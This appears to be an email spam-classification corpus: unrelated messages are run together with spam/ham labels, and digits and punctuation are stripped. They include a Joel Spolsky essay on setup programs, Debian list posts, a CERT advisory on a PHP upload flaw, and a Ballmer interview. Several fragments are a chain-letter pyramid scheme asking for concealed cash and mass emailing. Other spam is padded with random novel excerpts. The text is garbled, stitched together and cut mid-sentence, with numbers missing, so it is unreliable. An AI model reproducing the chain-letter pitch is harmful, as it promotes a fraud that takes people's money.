even if  you force the user to back up and fix it  you still have to undo the first part  of the work that you did before creating the account  otherwise you ve left  their system in an indeterminate state    In any case I need to write code to create the account and delete the account  in case something later fails  I might as well call that code on this page of  the wizard where I can display a useful error message    And what are the kinds of things that need to be reversable  Well  in order to  upgrade FogBUGZ without requiring a reboot  and we _never  ever _require a  reboot   we have to shut down a couple of processes that might have been  keeping FogBUGZ files pinned down  such as IIS  Microsoft s web server   So  part one of the batch is  Stop IIS   Now if part   fails for some reason  it  would be _extremely_ rude to leave IIS not running  And anyway  it s not like I  don t need to write the code for  Start IIS  for the end of the batch  So the  code to rollback  Stop IIS  is already written  No big deal  I just need to  call it at the right place    I think one reason that people think you should  gather all the info and then  do all the work  is because with very large installation programs that are very  slow  this is a polite way to waste less of the user s time  Indeed even  FogBUGZ setup does     of its work at the very end  But the  create account   operation is so fast  that principle simply doesn t apply here  Even our     of  the work phase takes well under a minute  most of which is spent waiting for  IIS to stop and start      Why did you use VC   MFC  Surely an advanced intelligence such as yourself  has admitted by now that Delphi[ ] is more productive    First of all  leave  your language religious fanaticism at the Usenet door  Somehow I managed  to figure out_ in high school_ that language advocacy and religious  arguments are unbelievably boring     Secondly  even if Delphi were more productive  the only pertinent question   since I am writing the code  is _what is more productive for Joel Spolsky_  And  I don t know Delphi at all  but I know Win    MFC  and VC   _really  really  well_  So while I might not outcode a good Delphi programmer  I would  definitely outcode a completely inexperienced Delphi programmer  which is me    certainly over a short   week project  Third  many of the things I needed to do  in this setup program are things like  grant the Logon as Service privilege to  an account   This is rare enough that the only way to find out how to do this  is to search the Microsoft knowlege base and the web in general  When you  search the web in general for how to do fancy things with Windows NT  what you  find is about     C code  maybe     VB code  and    everything else  Yes  I  know  I could translate the C code into Delphi  assuming I was a sophisticated  Delphi programmer  not a completely inexperienced Delphi programmer   but that  costs as much productivity as I would supposedly gain from your supposedly more  productive programming language  And fourth  I already had about     of the  code I needed for Setup in MFC format  from FogBUGZ     Setup  and a library  I ve been using for years to make wizards      Why make Setup at all  You already have your customers  money  Good Setup  programs don t increase sales    This was actually the smartest question and  made me think the hardest  I came up with three reasons      Decreased tech support cost  This setup program will pay for itself over the  life of the code     Delight my customers  When I m trying to get them to upgrade to      I want  them to remember how painless the     installation was  so they won t hesitate  because they are afraid to upgrade  I m still using an old version of  SpamAssassin that is becoming increasingly ineffective  even though I know the  new version is much better  because I just can t bear the thought of another  morning wasted  The very memory of the first SpamAssassin installation    all  the little SSH windows  some su ed  trying to scroll through man pages and  Google Groups  accidentally hitting Ctrl Z in Emacs to undo and having it  suspend  trying to guess why we can t get the MTA to run procmail  sorry it s  too much  If SpamAssassin was making money off of upgraders they would have  lost my business because they don t have a SETUP program     Win reviews  Software reviewers always cast about for some kind of  standardized way to rate software  even when they are comparing apples and  oranges and planets and   th century philosophers  They always have a  meaningless list of things to review which can be applied to PC games   mainframe databases  web site auction software  and DNA sequencing  software  And Setup is always on their list  A single flaw in setup is  guaranteed to be mentioned in every review because every reviewer will see it  and say  Aha       How can we make WISE[ ] better    Kudos to the product manager of WISE  Installation System for calling me up and listening to my litany of all the  reasons his product wasn t adequate for typical IIS ASP SQL

LXDE does not log out I am running LXDE on Squeeze and am keeping it up to date   I recently noticed that I can not log out of a session   Trying to do so results in no response at all   I can shut down  or reboot without any problems  but logout does nothing   I don t know if this started after the full upgrade that I did last Monday  which caused other LXDE problems  or not  as I don t think I had tried to do a logout on this system before then   This isn t a big issue  as it is on my laptop  on which I am the only user and I am usually either logged in and working  or the system is shut down   I am primarily worried that this is a symptom of some other problem that I have not yet noticed   Any ideas what could be causing this      Marc Shapiro  mshapiro_   yahoo com           To UNSUBSCRIBE  email to debian user REQUEST lists debian org   with a subject of  unsubscribe   Trouble  Contact listmaster lists debian org  Archive  http   lists debian org              qm web      mail re  yahoo com      ,1
Re  installing Lenny packages in SqueezeOn Thu  Apr          at         AM        Boyd Stephen Smith Jr  wrote     On Wednesday    April               Rob Owens wrote       My understanding is that live helper must build the kernel so that      certain modules necessary to the live system get included   I confess      that I don t completely understand that answer  but it s what I was told      by the developer         You should look into the live helper configuration and adjust where it gets     the kernel source and any  extra   patches it applies   It should be able to     work with kernel sources provided from lenny backports with the proper     configuration  since it already works with both Lenny and Squeeze kernel     sources   The bpo kernels are not packaged significantly differently         If live helper doesn t have any relevant configuration  looking into how it     receives  patches  compiles  and packages the kernel should give you some     insight into a work around    e g  repackaging the bpo kernel package to have     the same package name but a higher version than the Lenny kernel package      Thanks   I think this is the approach I m going to take   I just tried  install barebones Squeeze in Virtualbox  and I m running into packaging  problems when I try to install certain software from Lenny  LXDE and  apt show versions  for example       Rob           To UNSUBSCRIBE  email to debian user REQUEST lists debian org   with a subject of  unsubscribe   Trouble  Contact listmaster lists debian org  Archive  http   lists debian org                GA     aurora owens net      ,1

SunWell  it looks like Sun are going ahead with their ubiquitous computing plans without Mithril    Greg  Reuters Market News   Sun Micro Outlines Roadmap for Managing Networks    Friday September          am ET    By Peter Henderson     SAN FRANCISCO  Reuters    Computer maker Sun Microsystems Inc  on Thursday   said it would create in a few years a network environment that will be as   straightforward to handle as a single machine  a strategy it calls N      It laid out a road map for a new layer of intelligent software and systems that will meld   unwieldy networks into easy to use systems  a goal similar to those of most rivals   making computers which manage networks     EMC Corp  announced this week software aimed at allowing users to manage storage   resources as a pool  Hewlett Packard Co has a Utility Data Center  designed for   broader management  International Business Machines Corp s project eLiza is working   to make computers  self healing  when systems break      Applications still have to run zeroes and ones on some computing engine but the   whole idea behind N  is you stop thinking about that  You don t think about what box   it is running on   Sun Vice President Steve MacKay  head of the N  program  said in an   interview on the sidelines of a Sun user conference      Many industry executives see computer power eventually being sold like power or   water  as a utility that can be turned on or off  in whatever volume one wants whenever   needed     For that to happen computers must be tied together seamlessly  rather than cobbling   them together with tenuous links  as most networks do today  experts say  There are   still major barriers  though  such as communications standards for machines from   different vendors to interoperate closely     Sun promised to deliver a  virtualization engine  that would let administrators look at   their entire network as a pool by the end of the year  Network administrators today   often have no automatic system to report what is in the network       It ll tell you what you have and how it is laid out   promised MacKay   The second stage  beginning in       would allow users to identify a service  such as   online banking  and allocate resources for them with a few clicks  Sun said     Finally  in       Sun s software should allow networks to change uses of resources on   the fly in response to changing needs  such as a bank assuring quicker online response   time for priority users  the company said    ,1

            Let s say that you decide to start small  just to see how it goes  and we will assume you and those involved send out only       e mails each  Let s also assume that the mailing receives only a            of     response  the response could be much better but let s just say it is only        Also many people will send out hundreds of thousands of e mails instead of only       each   Continuing with this example  you send out only       e mails  With a      response  that is only    orders for report      Those    people responded by sending out       e mails each for a total of         Out of those        e mails only      responded with orders  That s     people who responded and ordered Report       Those     people mail out       e mails each for a total of         e mails  The      response to that is      orders for Report       Those      people send       e mails each for a total of   million e mails sent out  The      response is        orders for Report       Those

they cannot advertise until they receive the report              AVAILABLE REPORTS                      The reason for the  cash  is not because this is illegal or somehow  wrong   It is simply about time  Time for checks or credit cards to be cleared or approved  etc  Concealing it is simply so no one can SEE there is money in the envelope and steal it before it gets to you   ORDER EACH REPORT BY ITS NUMBER   NAME ONLY  Notes  Always send    cash  U S  CURRENCY  for each report  Checks NOT accepted  Make sure the cash is concealed by wrapping it in at least   sheets of paper  On one of those

about receiving  junk mail   I made fun of the whole thing  spouting my knowledge of the population and percentages involved  I  knew  it wouldn t work  Jody totally ignored my supposed intelligence and few days later she jumped in with both feet  I made merciless fun of her  and was ready to lay the old  I told you so  on her when the thing didn t work    Well  the laugh was on me  Within

that the initial investment was so little that there was just no way that I wouldn t get enough orders to at least get my money back  I was surprised when I found my medium size post office box crammed with orders  I made             in the first    weeks    The nice thing about this deal is that it does not matter where people live  There simply isn t a better investment with a faster

a try  Of course  I had no idea who to contact to get another copy  so I had to wait until I was e mailed again by someone else             months passed then it luckily came again       I did not

Re  akonadi first time start bugs with KDE      From nobody Wed Mar                  Content Type  Text Plain     charset  iso         Content Transfer Encoding  quoted printable  Am Donnerstag    Mai      schrieb Frederik Schwarzer     [Martin Steigerwald   Donnerstag    Mai              ]            Hi               JFYI as this might  partly  be packaging related               I found the following bugs with Akonadi since I upgraded to KDE            happening often  possibly always when I start Kontact for the first      time after starting a KDE session  On further starts of Kontact it      works as            expected     Umm  that s interesting  I had this since KDE        self compiled  and    it vanished when switching from the       debs to the       ones     So I thought it was just fixed for        Now I wonder what I did to    make it work     Well  Thats what I mean  Do you  understand  whats going on there     I am a Linux trainer  consultant and administrator since    years and     still don t get  why  this happen and  what  it triggers  I might get it     when I study MySQL  DBUS  Resource Agents  Nepomuk   whatever  else it     uses   but I am and I want to be  just a user  of this stuff        So I think this is for upstream to solve   and if it ain t work reliably     in KDE     I think it has to be fixed within KDE     series  Akonadi might        use MySQL or not  but it if uses it  KAddressBook should still just work      predictably      Thus I suggest reporting anything like that upstream   especially to you      Boyd   complaining here probably just won t help  And if upstream does not        get bug reports they probably don t even know that something is broken on     probably only  some  systems     Some issues might be packaging related  but then I hope to get hints back     from upstream developers so that I can file debian bug reports with proper        suggestions  Until then I think I default to reporting upstream  unless     someone convinces me to do elsewise     Ciao     D      Martin  Helios  Steigerwald   http   www Lichtvoll de  GPG    B   D C            AFA  B  F    B EAAC A      C   ,1

CERT Advisory CA         Vulnerability in PHP       BEGIN PGP SIGNED MESSAGE       CERT Advisory CA         Vulnerability in PHP     Original release date  July             Last revised        Source  CERT CC     A complete revision history can be found at the end of this file   Systems Affected         Systems running PHP versions       or        Overview     A  vulnerability  has been discovered in PHP  This vulnerability could    be  used  by  a remote attacker to execute arbitrary code or crash PHP    and or the web server   I  Description     PHP  is  a  popular  scripting  language  in  widespread use  For more    information about PHP  see            http   www php net manual en faq general php     The  vulnerability  occurs  in the portion of PHP code responsible for    handling  file uploads  specifically multipart form data  By sending a    specially  crafted  POST  request  to  the web server  an attacker can    corrupt  the  internal  data  structures used by PHP  Specifically  an    intruder  can  cause  an improperly initialized memory structure to be    freed   In  most  cases  an intruder can use this flaw to crash PHP or    the  web  server  Under some circumstances  an intruder may be able to    take  advantage  of  this  flaw  to  execute  arbitrary  code with the    privileges of the web server      You  may  be  aware that freeing memory at inappropriate times in some    implementations  of  malloc  and  free  does not usually result in the    execution  of  arbitrary  code   However  because PHP utilizes its own    memory  management  system   the  implementation of malloc and free is    irrelevant to this problem      Stefan  Esser  of  e matters  GmbH has indicated that intruders cannot    execute   code   on   x     systems    However   we  encourage  system    administrators  to  apply  patches  on  x    systems  as well to guard    against denial of service attacks and as yet unknown attack techniques    that may permit the execution of code on x   architectures      This  vulnerability  was discovered by e matters GmbH and is described    in  detail  in  their  advisory   The  PHP  Group  has  also issued an    advisory   A list of vendors contacted by the CERT CC and their status    regarding this vulnerability is available in VU             Although   this  vulnerability  only  affects  PHP         and            e matters  GmbH  has  previously  identified  vulnerabilities in older    versions  of  PHP   If  you  are  running  older  versions  of PHP  we    encourage you to review    http   security e matters de advisories        html  II  Impact     A  remote  attacker can execute arbitrary code on a vulnerable system     An  attacker  may not be able to execute code on x   architectures due    to  the way the stack is structured  However  an attacker can leverage    this  vulnerability  to  crash PHP and or the web server running on an    x   architecture   III  Solution  Apply a patch from your vendor     Appendix A contains information provided by vendors for this advisory     As  vendors report new information to the CERT CC  we will update this    section  and note the changes in our revision history  If a particular    vendor  is  not  listed  below   we  have not received their comments     Please contact your vendor directly   Upgrade to the latest version of PHP     If  a  patch  is  not  available  from your vendor  upgrade to version            Deny POST requests     Until  patches  or an update can be applied  you may wish to deny POST    requests   The  following  workaround  is  taken from the PHP Security    Advisory        If  the  PHP  applications on an affected web server do not rely on      HTTP POST input from user agents  it is often possible to deny POST      requests on the web server        In  the  Apache  web server  for example  this is possible with the      following  code  included  in  the  main  configuration  file  or a      top level  htaccess file                 Order deny allow         Deny from all             Note  that an existing configuration and or  htaccess file may have      parameters contradicting the example given above   Disable vulnerable service     Until  you  can upgrade or apply patches  you may wish to disable PHP     As a best practice  the CERT CC recommends disabling all services that    are not explicitly required  Before deciding to disable PHP  carefully    consider your service requirements   Appendix A    Vendor Information     This  appendix  contains  information  provided  by  vendors  for this    advisory   As  vendors  report new information to the CERT CC  we will    update this section and note the changes in our revision history  If a    particular  vendor  is  not  listed  below  we have not received their    comments   Apple Computer Inc             Mac  OS  X  and  Mac  OS X Server are shipping with PHP version                  which  does  not  contain the

[Spambayes] Ditching WordInfo  Yeah  that s exactly what I was doing  I didn t realize I was   incurring administrative pickle bloat this way   I m specifically   trying to make things faster and smaller  so I m storing individual   WordInfo pickles into an anydbm dict  keyed by token    The result   is that it s almost    times faster to score messages one per run   our of procmail      s vs       s    This is very worthwhile     However  it  does  say all over the place that the goal of this   project isn t to make the fastest or the smallest implementation  so   I guess I ll hold off doing any further performance tuning until the   goal starts to point more in that direction      seconds is probably   fast enough for people to use it in their procmailrc  which is what   I was after   Maybe   I batch messages using fetchmail  don t ask why   and adding    seconds per message for a batch of     not untypical  feels like a real wait to me       Guido van Rossum  home page  http   www python org  guido   ,1

asynchronous I O  was Re  Gasp  Of course we ve had select   since BSD     and poll   since System V or so  and they work reasonably well for asynchronous I O up to a hundred or so channels  but suck after that   dev poll  available in Solaris and Linux  is one approach to solving this  Linux has a way to do essentially the same thing with real time signals  and has for years  and FreeBSD has kqueue   More details about these are at http   www citi umich edu projects linux scalability   None of this helps with disk I O  most programs that need to overlap disk I O with computation  on either proprietary Unixes or Linux  just use multiple threads or processes to handle the disk I O   POSIX specifies a mechanism for nonblocking disk I O that most proprietary Unixes implement   The Linux kernel hackers are currently rewriting Linux s entire I O subsystem essentially from scratch to work asynchronously  because they can easily build efficient synchronous I O primitives from asynchronous ones  but not the other way around  So now Linux will support this mechanism too   It probably doesn t need saying for anyone who s read Beberg saying things like  Memory management is a non issue for anyone that has any idea at all how the hardware functions   but he s totally off base  People should know by now not to take anything he says seriously  but apparently some don t  so I ll rebut   Not surprisingly  the rebuttal requires many more words than the original stupid errors   In detail  he wrote    Could it be  After    years without this feature UNIX finally   catches up to Windows and has I O that doesnt [sic] totally suck for   nontrivial apps  No way   Unix acquired nonblocking I O in the form of select   about    years ago  and Solaris has had the particular aio_  calls we are discussing for many years   Very few applications need the aio_  calls     essentially only high performance RDBMS servers even benefit from them at all  and most of those have been faking it fine for a while with multiple threads or processes   This just provides a modicum of extra performance     OK  so they do it with signals or a flag  which is completely   ghetto  but at least they are trying  Keep trying guys  you got the   idea  but not the clue   Readers can judge who lacks the clue here     The Windows I O model does definately [sic] blow the doors off the   UNIX one  but then they had select to point at in it s [sic]   suckiness and anything would have been an improvement  UNIX is just   now looking at it s [sic] I O model and adapting to a multiprocess   multithreaded world so it s gonna be years yet before a posix API   comes out of it   Although I don t have a copy of the spec handy  I think the aio_  APIs come from the POSIX spec IEEE Std              section        which is    years old  and which I think documented then current practice  They might be even older than that   Unix has been multiprocess since       and most Unix implementations have supported multithreading for a decade or more     Bottom line is the  do stuff when something happens  model turned   out to be right  and the UNIX  look for something to do and keep   looking till you find it no matter how many times you have to look    is not really working so great anymore   Linux s aio_  routines can notify the process of their completion with a  signal   a feature missing in Microsoft Windows  a  signal  causes the immediate execution of a  signal handler  in a process   By contrast  the Microsoft Windows mechanisms to do similar things  such as completion ports  do not deliver a notification until the process polls them   I don t think signals are a better way to do things in this case  although I haven t written any RDBMSes myself   but you got the technical descriptions of the two operating systems exactly backwards  Most programs that use Linux real time signals for asynchronous network I O  in fact  block the signal in question and poll the signal queue in a very Windowsish way  using sigtimedwait   or sigwaitinfo                Kragen Sitaker      Edsger Wybe Dijkstra died in August of        This is a terrible loss after  which the world will never be the same  http   www xent com pipermail fork      August        html  ,1

Dish Networks best offer of the year and save over              Yet he read much about the war  Some of the recounted episodes deeply and ineffaceably impressed him  For example  an American newspaper correspondent had written a dramatic description of the German army marching  marching steadily along a great Belgian high road  a procession without beginning and without end  and of the procession being halted for his benefit  and of a German officer therein who struck a soldier several times in the face angrily with his cane  while the man stood stiffly at attention  George had an ardent desire to spend a few minutes alone with that officer  he could not get the soldier s bruised cheek out of his memory   Good evening once more  Miss Nowell  he said      I _might_  you knaoo  said Marrier  brightening to full hope in the fraction of a second General  the Chouans have no doubt brought arms for those escaped recruits  Now  if we try to outmarch them  they will catch us in the woods and shoot every one of us before we can get to Ernee  We must argue  as you call it  with cartridges  During the skirmish  which will last more time than you think for  some of us ought to go back and fetch the National Guard and the militia from Fougeres    What could it all mean  Why that medium for her message  Should he write and ask her  But what was there to ask or say  in the face of her silence  Besides  he had not even her address  Miss Camilla could doubtless give him that  But would she  How much did she understand  Why had she turned so unhelpful   She wouldn t see him  She s very strong willed     That s a wonderful woman  hibody  Io s voice shook a little     We can t stop their tongues  he said at last  Ah  I did a foolish thing       She turned upon him the sparkle of golden lights in wine brown eyes  It s a fairy bower  I m going to do a bewitchment   What makes you think it was Colonel de Peyster or any other English or Tory officer who saved me from the Indians  Well  it wasn t  If Colonel Bird and your other white friends had had their way when I was taken I should have been burned at the stake long before this  It was the Wyandot chief  Timmendiquas  known in our language as White Lightning  who saved me          I beg your pardon  the stranger said  addressing him in pure and limpid English  which sounded to Philip like the dialect of the very best circles  yet with some nameless difference of intonation or accent which certainly was not foreign  still less provincial  or Scotch  or Irish  it seemed rather like the very purest well of English undefiled Philip had ever heard   only  if anything  a little more so  I beg your pardon  but I m a stranger hereabouts  and I should be so VERY much obliged if you could kindly direct me to any good lodgings   Yes  said she  The landlady wanted the money  she told me  So Nellie gave me her share  and I paid it at once                Data Entry from Home                        He belonged to that small minority of undemonstrative retiring natures  who are always at peace with themselves  and who are conscious of a feeling of humiliation at the mere thought of making a request  no matter what its nature may be  So promotion had come to him tardily  and by virtue of the slowly working laws of seniority  He had been made a sub lieutenant in       but it was not until      that he became a major  in spite of the grayness of his moustaches  His life had been so blameless that no man in the army  not even the general himself  could approach him without an involuntary feeling of respect  It is possible that he was not forgiven for this indisputable superiority by those who ranked above him  but  on the other hand  there was not one of his men that did not feel for him something of the affection of children for a good mother  For them he knew how to be at once indulgent and severe  He himself had also once served in the ranks  and knew the sorry joys and gaily endured hardships of the soldier s lot  He knew the errors that may be passed over and the faults that must be punished in his men  his children  as he always called them  and when on campaign he readily gave them leave to forage for provision for man and horse among the wealthier classes   Master Pillsbury pursed his lips and his expression became severe   Yes  I shall outlive it  else I should have little faith in myself  But I shall not forget  and if you would remain forever what you now are to me  you will so act that nothing may mar this memory  if it is to be no more  I doubt your power to forget an affection which has survived so many changes and withstood assaults such as Geoffrey must unconsciously have made upon it  But I have no right to condemn your beliefs  to order your actions  or force you to accept my code of morals if you are not ready for it  You must decide  but do not again deceive yourself  and through whatever comes hold fast to that which is better worth preserving than husband  happiness  or friend   What s the price  asked Ellis  of the cigar and the compliment together  In other words  what do you want of me    A boat  Lord  that sounds good  sighed Banneker     Brian is not unkind to you  I hope   cried Bessie  prepared to be indignant         by a new destroyer  a gentlemanly vulture  whose suave accents and perfect manners were fatal to the unwary  Henceforth Horatio Cromie Nugent Paget flourished and fattened upon the folly of his fellow men  As promoter of joint stock companies that never saw the light  as treasurer of loan offices where money was never lent  as a gentleman with capital about to introduce a novel article of manufacture from the sale of which a profit of five thousand a year would infallibly be realized  and desirous to meet with another gentleman of equal capital  as the mysterious X Y Z  who will  for so small a recompense as thirty postage stamps  impart the secret of an elegant and pleasing employment  whereby seven pound ten a week may be made by any individual  male or female   under every flimsy disguise with which the swindler hides his execrable form  Captain Paget plied his cruel trade  and still contrived to find fresh dupes  Of course there were occasions when the pigeons were slow to flutter into the fascinating snare  and when the vulture had a bad time of it  and it was a common thing for the Captain to sink from the splendour of Mayfair or St  James s street into some dingy transpontine hiding place  But he never went back to Tulliver s terrace  though Mary Anne pleaded piteously for the payment of her poor mother s debt  When her husband was in funds  he patted her head affectionately  and told her that he would see about it  i e  the payment of Mrs  Kepp s bill  while  if she ventured to mention the subject to him when his purse was scantily furnished  he would ask her fiercely how he was to satisfy her mother s extortionate claims when he had not so much as a sixpence for his own use              ,0

Re  alsa driver spec tweak for homemade kernelsOn Wed  Oct          at         PM        Matthias Saou wrote      So I ve attached a patch to specify an alternate kernel by setting the      TARGET_KERNEL  environment variable before running rpmbuild  You     still need to have the rpm for the specified kernel installed  but at     least it doesn t have to be currently running  It s kinda hackish  so     if someone has a better way to do this  let me know       That idea looks good although it maybe needs to be tweaked a bit more  what   you sent doesn t support packages named  kernel smp    I d also prefer a   cleaner way than the env variable  and preferrably not editing the spec      probably    define  target     xx xx    with smp   Sound good enough    The BuildRequires on  kernel source  will also need to be removed because   it won t necessarily need to be true  and that does bug me a bit      The    define  is exactly what I was looking for  I was trying to figure out a way to do it within the mechanism of rpm  like the    with  switches   but for some reason didn t think of using    define   My computer is currently gone for repairs  but once it s back  I ll rewrite the specfile  add support for kernel smp  and email it to the list for further criticism     As far as requiring kernel source  I don t feel it s a big problem  If you re gonna go to the trouble of packaging custom kernels into rpms  it s not a far stretch to package the source tree too  as I currently do    Also  I ve found that the alsa driver source needs a usb related patch  to compile under the latest test kernels         preX   Are other  people seeing the same thing  or is this just a problem with my setup   gary  P S  If I didn t mention it before  thanks for the alsa packages  They  greatly simplified what used to take way too long before   _______________________________________________ RPM List mailing list  http   lists freshrpms net mailman listinfo rpm list   ,1

in last week s issue  James Woodfield pointed out that there is another possible explanation  In medieval Latin  the ventricles of the heart were at times called  cochleae cordis   where the second word is derived from  cor   heart  Those unversed in Latin could have misinterpreted  cochleae  as  cockles   Oddly   cochlea  in Latin means  snail   from the shape of the ventricles   it s also the name of the spiral cavity of the inner ear   so if this story is right we should really be speaking of warming the snails of one s heart   SERRANCIFIED  Many of you supplied your own memories of this odd expression that I tried to make sense of last week  Taken together  they show that the expression is best known in Canada and that it was originally something like  My sufficiency has been suffonsified and anything additional would be superfluous   That form of the word is the one that is most common in online searches  where the Canadian focus is also obvious  Cheryl Caesar noted that

reviewer has the pen name  Sufficiently Suffonsified   Oddly  there s also a      record by the Austrian band Cunning Dorx entitled  Paradigms Suffonsified   G H Gordon Paterson suggested that the

on how to become and remain thin  often through tips on avoiding eating  and how to disguise the condition from family and friends  Other themes sometimes featured on such sites are self mutilation

Wasting Away on the Web and Dying To Be Thin  Medical professionals in the US and UK are deeply concerned about them  because they accentuate the low self regard of young women  who are particularly

                        A person who has the use or enjoyment of something  especially property   We are short of words that contain four u s  Among the few that are even relatively common  leaving aside the Hawaiian  muu muu   are  tumultuously  and  unscrupulous   although some rare words like  pustulocrustaceous  and  pseudotuberculous  are also recorded   The term comes from Roman law   Usufruct  is the right of temporary possession or enjoyment of something that belongs to somebody else  so far as that can be done without causing damage or changing its substance  For example  a slave in classical Rome could not own anything  Things he acquired as the result of his labour he merely held  usus  et  fructus   under  use  and  enjoyment    it was his master who actually owned them   The term remains in use in modern US legal practice and elsewhere  These days a  usufructuary  can be a trustee who enjoys the income from property he holds in trust for somebody else  Many Native American groups hold land on a  usufruct  basis  with rights to enjoy the renewable natural resources of the land for hunting and fishing       Q A                                                                     Q  How does the term  three sheets to the wind  denote drunkenness  [Benjamin Weatherston]  A  It s a sailor s expression   We ignorant landlubbers might think that a sheet is a sail  but in traditional sailing ship days  a  sheet  was actually a rope  particularly one attached to the bottom corner of a sail  it comes from an Old English term for the corner of a sail   The sheets were vital  since they trimmed the sail to the wind  If they ran loose  the sail would flutter about in the wind and the ship would wallow off its course out of control   Extend this idea to sailors on shore leave  staggering back to the ship after a good night on the town  well tanked up  The irregular and uncertain locomotion of the jolly seafarers must have reminded onlookers of the way a ship moved in which the sheets were loose  Perhaps one loose sheet might not have been enough to get the image across  so the saying became  three sheets to the wind    Our first written example comes from that recorder of low life  Pierce Egan  in his  Real life in London  of       But it must surely be much older                                        Q  My East End mother in law used to say she was  well and truly mogadored  when she was puzzled by something  Any idea of derivation and meaning  [Bryan]  A  Now that s a bit of British slang I haven t heard in years  though it is still around  Nanny Ogg uses it in one of Terry Pratchett s Discworld fantasy stories  I am told   As you say  it means that somebody is puzzled  confused  or  all at sea   It s also sometimes spelled  moggadored   though it doesn t turn up in print much in either spelling   No relation to the British word  moggy  for a cat  by the way  which seems to be a pet form of  Margaret     The writers of slang dictionaries are decidedly mogadored about its origin  It looks very much like rhyming slang for  floored   which is likewise slang  meaning dumbfounded or confused  But the dispute arises over what the root is  Some say it is Irish  from  magagh   to mock  jeer or laugh at  via an unrecorded intermediate form  mogad i    Others suggest that  like some other East End slang terms  it derives from the Gypsy language Romany  Cockney slang is like London itself  a melting pot  in which words from many sources are amalgamated  including Yiddish and old time forces slang derived from languages around the world   In this case the source may be  mokardi  or  mokodo   something tainted  these Romany words also provide the root for yet another slang phrase   to put the mockers on something   to jinx it    Sorry not to be able to be more definite                                        Q  I was having an interesting discussion with an American professor of business studies who also consults to industry  She was recalling an unbudgeted initiative within a major software corporate  which the UK managing director described as a  skunk project   I have seen this epithet before  usually in the phrase  skunk works   meaning a semi official project team that is tacitly licensed to bend the rules and think outside the box  I wonder what the derivation is  I don t think it can refer to the smelly wild animal  but neither I think can it refer to the street term for a strong variant of marijuana  Can you shed any light  [Martin Hayman]  A  We must start in Dogpatch  the fictional place in the backwoods of upper New York State made famous between      and      as the home of professional mattress tester Li l Abner  in the comic strip written and drawn by Al Capp  The original was actually  Skonk Works   the place where Lonesome Polecat and Hairless Joe brewed their highly illicit bootleg Kickapoo Joy Juice from ingredients such as old shoes and dead skunks    Skonk  is a dialect variant of  skunk     We must now move to the very real Burbank  California  In       a small group of aeronautical engineers working for the then Lockheed Aircraft Corporation  headed by Clarence  Kelly  Johnson  were given the rush job of creating an entirely new plane from scratch  the P     Shooting Star  jet fighter  This they did in     days     days ahead of schedule  Their secret project was housed in a temporary structure roofed over with an old circus tent  which had been thrown up next to a smelly plastics factory  The story goes that one of the engineers answered the phone on a hot summer day with the phrase  Skonk Works here  and the name stuck  It is also said that Al Capp objected to their use of his term and it was changed to Skunk Works   One division of the company  formally the Lockheed Martin Advanced Development Program  is still known as the Skunk Works  The term has been trademarked by Lockheed Martin  who have been aggressive in protecting it   As a generic term  it dates from the     s  One definition is very much that of the original and the one you describe  a small group of experts who drop out of the mainstream of a company s operations in order to develop some experimental technology or new application in secrecy or at speed  unhampered by bureaucracy or the strict application of regulations  Kelly Johnson formulated    visionary rules for running such an operation  which are still regarded as valid even now   It is also sometimes used for a similar group that operates semi illicitly  without top level official knowledge or support  though usually with the tacit approval of immediate management       Endnote                                                                     The principal design of a grammar of any

[Infoworld] Ballmer describes what a Chief Software Architect doesRohit was wondering what Microsoft s definition of a Chief Software Architect is  and  consequently  what Microsoft thinks is a roadmap   Here you go  from Mr  Ballmer to Mr  Gillmor to Mr  FoRK    Architecture is war  love  em or hate  em  at least Microsoft understands that  as Chief SA  BillG oversees all product strategy    There are two things a road map can be  One is just a piece of paper that tells what everyone is doing and records a bunch of bottom up plans  Or it can be something where we impose more broadly our vision from the top  We are not going to try to get everything shared      That s a path for getting everything stopped up  But at the same time we are trying to take the top four or five things we are trying to do in the Longhorn wave  Yukon wave  or the  Net wave and really have enough time to have some cross cutting discussions about how we make that happen     Bill [Gates] is dedicated full time to being chief software architect  He also happens to be chairman of the company  but he spends most of his time being chief software architect  We have a body now that meets every month    the SLTT [Senior Leadership Technical Team]  basically the top people involved in the product creating strategy    and we present and discuss the issues  Bill is driving a process for each of these waves  For instance  [he will ask] what are the cross cutting scenarios that I want  and then [he will] get all the right product groups together and bring these things in front of the SLTT     People talk about what it takes to be a good manager  and people talk about being a good coach and getting people to like you  In a large organization those things are important  but at a certain level      the most important thing you can do for your people to make them better is to give them a framework where they can work in harmony with the other people in the company  And from Bill s perspective  [this framework] is the technical road map and the SLTT process  it is the scenarios  From my perspective  it is the P L [profit and loss] structure and the multiple businesses because  given how we work  giving people a framework that gets them to make the whole bigger than the sum of the parts will mean we have better offerings      http   www infoworld com articles pl xml                plballmer xml  Ballmer in charge  July               pm PT  NO ONE KNOWS better than Microsoft CEO Steve Ballmer that  as the  Net platform evolves  the success of Microsoft depends on how well the company coordinates its tool  server  and client strategies and how well it communicates that vision  In an interview with InfoWorld Test Center Director Steve Gillmor and InfoWorld Editor at Large Ed Scannell at Microsoft Fusion       Ballmer discussed the progress of  Net  changes in the company s approach to product development  and Microsoft s efforts to simplify product licensing and inspire trust in customers and partners     Last time we talked was two years ago  at the beginning of the  Net   era  So where are we now in the  Net evolution   Let me start by talking about where I think we are in the XML revolution first  and then [I will] talk about where we are with  Net  I believe that the IT industry collectively decided over the last three or four years that the world was going to be replatformed with XML as the key foundation  It s not like anyone ever got together to decide this  but it s like magnetic north  where it s been clearly indicated that everyone is rallying around the concept  But I think the degree to which [XML] is pervasive might still be underestimated  A lot of partners  even at this conference  see it as b to b for big companies  But it is really about the way software in general is designed  It is all about the way security should work  Management    everything is changed   So to answer your direct question  two years ago I might have said the jury is still out about whether [XML] was going to happen  We were questioning if it was going to be a legitimate competitor to Java  But now the world has decided to embrace [XML] as the basis for the next generation of technology  And there are a lot of benefits that come with it  Could it have been something other than XML  Sure it could have  It wasn t the specific technical implementation  it is merely the fact that it comes out of Internet standards  It has deeper semantic abilities  It is all about interoperability and connection   So in that context  where are we with  Net  I ll say a couple things  No     I would say we have some momentum in the market  We have customers using the  Net product line  like Merrill [Lynch]  Credit Suisse  Marks   Spencer  CitiBank  and a variety of others  People who are doing some things for real  I feel like the degree we are out front is in some ways smaller and in some ways larger     How so   Smaller in the sense that everyone is talking the XML talk  even Sun  bigger in the execution sense  We ve delivered  We delivered the first batch of products that really were built XML to the core    Visual Studio  Net and BizTalk Server    and we are getting traction  So I feel good about where our execution is relative to everyone else  That is not to say that other people aren t doing some reasonable bolt on XML support for the stuff they have     You have some heavy lifting to do to convince your customers and   partners to follow along  What do you have to do to set the standard   for adoption and upgrading to this next generation   We have to present the picture that we are behaving consistently within the framework of 